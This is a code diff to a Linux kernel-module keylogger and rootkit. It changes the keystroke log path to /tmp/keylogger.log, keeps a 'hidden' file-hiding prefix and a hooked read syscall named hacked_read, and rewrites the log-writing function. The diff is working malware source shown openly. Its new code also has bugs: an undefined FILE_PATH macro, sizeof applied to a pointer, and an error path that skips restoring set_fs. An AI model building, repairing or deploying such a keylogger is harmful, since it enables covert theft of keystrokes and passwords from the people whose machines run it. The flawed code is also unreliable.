@@ -9,7 +9,7 @@
 #define enable_shutdown 0
 #define HIDE_PREFIX "hidden"
 #define HIDE_PREFIX_SZ (sizeof(HIDE_PREFIX) - 1)
-#define LOGFILE "/keylogger.log"
+#define LOGFILE "/tmp/keylogger.log"
 
 MODULE_LICENSE("GPL");
 MODULE_VERSION("0.01");
@@ -108,37 +108,29 @@ int write_to_logfile(char *buffer)
 {
 	struct file *file = NULL;
 	mm_segment_t fs;
-	int error;
+	loff_t pos = 0;
+    int ret;
 
 	file = filp_open(LOGFILE, O_CREAT|O_APPEND, 00666);
 
 	if (IS_ERR(file)) {
-		error = PTR_ERR(file);
-		goto out;
-	}
-	error = -EACCES;
-	// if (!S_ISREG(file->f_dentry->d_inode->i_mode))
-	// 	goto out_err;       f_dentry is now outdated.
-	error = -EIO;
-	if (!file->f_op->write)
-		goto out_err;
-	error = 0;
+        printk(KERN_ERR "Failed to open file: %s\n", FILE_PATH);
+        return PTR_ERR(file);
+    }
 
 	fs = get_fs();
 	set_fs(KERNEL_DS);
 
-	file->f_op->write(file, buffer, strlen(buffer), &file->f_pos);
-
+	ret=vfs_write(file, buffer, sizeof(buffer) - 1, &pos);
+	if (ret < 0) {
+        printk(KERN_ERR "Failed to write to file: %d\n", ret);
+        filp_close(file, NULL);
+        return ret;
+    }
 	set_fs(fs);
-	filp_close(file,NULL);
+    filp_close(file, NULL);
+	return 0;
 
-out:
-	return error;
-
-out_err:
-	filp_close(file, NULL);
-	printk(KERN_INFO "keylogger: file error.\n");
-	goto out;
 }
 
 asmlinkage int hacked_read(unsigned int fd, char *buf, size_t count)
